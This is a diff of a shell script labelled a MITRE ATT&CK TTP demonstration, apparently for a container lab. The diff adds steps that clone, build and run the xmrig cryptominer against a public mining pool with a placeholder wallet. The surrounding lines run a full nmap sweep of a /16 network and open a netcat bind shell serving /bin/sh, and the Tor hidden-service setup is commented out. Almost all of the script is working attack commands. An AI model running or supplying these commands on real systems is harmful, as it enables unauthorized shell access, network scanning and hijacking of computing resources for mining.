@@ -93,28 +93,43 @@ apk add socat
 apk add busybox-extras 
 apk add bash 
 apk add nc 
+apk add git build-base cmake libuv-dev openssl-dev hwloc-dev
+
 
 # SENARIO -- Reverse Webshell TOr
 ## Make Hidden services 
-mkdir -p /etc/tor/hidden_service
-echo "HiddenServiceDir /etc/tor/hidden_service
-HiddenServicePort 80 127.0.0.1:8080" > /etc/tor/torrc
+#mkdir -p /etc/tor/hidden_service
+#echo "HiddenServiceDir /etc/tor/hidden_service
+#HiddenServicePort 80 127.0.0.1:8080" > /etc/tor/torrc
 
 # Start Hidden to Service 
 tor & 
 
 # verify the hostname is correct 
 sleep 10 
-cat /etc/tor/hidden_service/hostname
+#cat /etc/tor/hidden_service/hostname
 
 ### Execute nmap 
+echo "[+] starting scanning processs"
 nmap -p- 10.0.0.0/16 > localhost.txt
 nmap -iL url2.txt  > results.txt
 
 ### Tor Listener
 nc -lvnp 8080 -e /bin/sh
 
+# Cryptominer Exectuion 
+git clone https://github.com/xmrig/xmrig
+cd xmrig
+mkdir build
+cmake 
+make
 
+### shart cryptominer 
+./xmrig -o pool.supportxmr.com:3333 -u 44XABCYourWalletAddressHere123 -p x
+
+## exit the cryto miner binary
+
+cd /
 # MITRE ATT&CK TTP Demonstration Script
 
 # === Initial Access and Execution ===
